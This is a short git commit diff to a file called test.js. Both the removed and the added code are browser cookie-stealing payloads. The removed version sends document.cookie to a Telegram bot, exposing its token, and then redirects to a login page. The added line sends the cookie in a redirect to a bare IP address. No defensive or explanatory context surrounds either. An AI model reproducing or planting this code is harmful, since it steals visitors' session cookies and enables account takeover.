b4c895866aca286267dc8ceb5ed0eb0f0f0ef861
AMAT0RY <81570058+AMAT0RY@users.noreply.github.com>
2026-03-27 14:44:58 +0300

    Update test.js

--- test.js
+++ test.js
@@ -1,4 +1,1 @@
-fetch('https://api.telegram.org/bot7961713165:AAFdb4A5nW87MqOOk53YKk-3gKEkaZRmlg0/sendMessage?chat_id=-1003590380246&text=' + encodeURIComponent(document.cookie))
-  .finally(() => {
-    window.location = "https://www.dist-mspk.ru/login/index.php";
-  });
+window.location = "http://64.188.79.250:8000/log?msg=" + encodeURIComponent(document.cookie);
